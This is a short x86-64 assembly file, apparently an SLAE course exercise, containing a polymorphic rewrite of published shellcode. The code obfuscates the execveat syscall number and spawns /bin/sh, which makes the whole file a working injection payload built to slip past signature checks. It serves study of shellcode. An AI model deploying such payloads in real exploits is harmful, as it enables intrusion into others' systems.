;Original shellcode: http://shell-storm.org/shellcode/files/shellcode-905.php
; This is the polymorphic version of the original shellcode, created for SLAE task nr 6

global _start
section .text

_start:
    xor     rax, rax
    mov     rax, 0x143
    sub     rax, 0x1
    xor     rdx, rdx
    push    rdx

    mov     rcx, 0x68732f2f6e69622f
    push    rcx
    push    rsp
    pop     rsi

    syscall
